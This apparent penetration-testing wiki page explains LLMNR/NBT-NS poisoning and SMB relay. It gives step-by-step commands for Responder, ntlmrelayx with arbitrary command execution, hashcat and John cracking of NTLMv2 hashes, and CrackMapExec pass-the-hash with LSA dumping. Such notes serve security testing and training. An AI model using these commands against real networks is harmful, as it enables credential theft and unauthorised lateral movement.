---
title: LLMNR
description: 
published: true
date: 2021-01-30T19:59:44.061Z
tags: network, postex, llmnr
editor: markdown
dateCreated: 2021-01-29T15:29:14.015Z
---

# Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.
(https://attack.mitre.org/software/S0174/) 

## Links 
Social Media
https://twitter.com/pythonresponder

Responder for Linux with Python
https://github.com/lgandx/Responder

Responder for Windows 
https://github.com/Kevin-Robertson/Inveigh

## Usage

## The Short: 

This allows an attacker to pretend to be another service and “claim” it as their own if the system can respond before the legitimate system can and in terms say :yes, that’s me send password” and collect over the wires passwords and password hashes and usernames. 

## The Long: 

Opening and operating this tool uses all the mDNS, LLMNR, NBT-NS and others in a way to collect possible NTLM (or other) credentials to be used to either crack or relay around a network that might be broadcasting the credentials around.
This allows you to also relay them with other tools. For this to best work you must find systems that do not have SMB signing enabled preferable V1 but v2 can work this is best done with crack map Exec (CME) in kali 
``` cme smb <CIDR> --gen-relay-list targets.txt ```

## MultiRelay: https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py


## NTLMRelayx : https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
Usage: ``` ntlmrelayx.py -t $target ```
Usage advanced: ``` ntlmrelayx.py -tf targets.txt -c $insert commands here$ ``` 

                        .

## HashCat 
``` hashcat -a 0 -m 5600 hashes.txt rockyou.txt -o cracked.txt -O ``` 
So, what does this do? Let’s break it down.
-a is for the attack type. 0 is used to specify we’re performing a dictionary attack.
-m is used to specify what type of hashes we’re looking to crack. Hashcat supports cracking dozens of different hash-types, so you’ll typically want to refer to their help documentation to know exactly which number to use. In our case, NTLMv2 hashes are represented by 5600
hashes.txt is a positional parameter. Hashcat expects you to place the name of the file containing your hashes first, which is what we’re doing here.
rockyou.txt is another positional parameter. Hashcat expects the name of the file that you wish to use for your dictionary attack.
-o is used to specify an output file. This is where we’d like the cracked passwords to be stored. If you don’t specify this flag, cracked passwords will be stored in a file called hashcat. potfile, which can be found in the hashcat directory.
-O is used to optimize the attack for the hardware running in our system. You may not need to use this.

## Jhon the ripper 
Usage: ``` john hasht.txt --wordlist=/usr/share/wordlists/rockyou.txt ``` 

## LLMNR Starting 

To start you need to find or locate responder usually 

Edit responder.conf
```
[Responder Core]

; Servers to start
SQL = On
SMB = Off     #off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    #off
HTTPS = On
DNS = On
LDAP = On
```

Then run 
``` sudo python Responder.py -I <interface> -rdw ```
``` sudo python Responder.py -I eht0 -rdw ```
Traffic should start to pop up
 Then set up the relay tool
``` ntlmrelayx.py -t $host$ ```
``` ntlmrelayx.py -tf $targets.txt$ ```

By default, it dumps the local SAM file if it can and if it does you can gain access with CME 
``` crackmapexec smb 10.55.100.0/24 -u $USER$ -H $HASH5120d0cb0df939e3044c5843e37b2c5f$ --local –lsa ```


## More Info Links
https://attack.mitre.org/techniques/T1557/001/
https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/
https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef
https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html




